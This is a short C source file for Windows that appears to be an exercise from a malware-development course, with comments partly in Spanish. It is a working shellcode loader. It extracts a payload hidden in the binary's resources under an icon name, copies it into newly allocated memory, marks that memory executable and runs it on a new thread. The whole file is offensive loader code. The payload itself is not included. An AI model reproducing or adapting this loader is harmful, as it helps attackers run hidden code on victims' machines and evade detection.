#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"

int main(void){

	void * exec_mem;
	BOOL rv; 
	HANDLE th; // define a HANDLE
	DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	
	unsigned char * payload;
	unsigned int payload_size; // obtain both dynamically
	
	
	// Extract payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA); // busca el recurso
	resHandle = LoadResource(NULL, res); // lo carga y devuelve un HANDLE
	payload = (char *) LockResource(resHandle); // pillamos un puntero a donde está cargado gracias al HANDLE
	payload_size = SizeofResource(NULL,res); // tamaño del resource para poder usarlo en las funciones posteriores
	
	// 1. Allocate memory 
	
	exec_mem =  VirtualAlloc(0, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
	printf("Memory allocated succesfully!");
	
	// 2. Copy our shellcode to the allocate memory
	
	RtlMoveMemory(exec_mem, payload, payload_size);
	
	// 3. Make allocated memory executable
	
	rv = VirtualProtect(exec_mem, payload_size, PAGE_EXECUTE_READ, &oldprotect);
	printf("Allocated memory is now executable!");
	
	getchar();
	
	if (rv != 0){ // function succeeds
		
		DWORD threadId;
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, &threadId);
		WaitForSingleObject(th, -1);
}

	return 0;
}


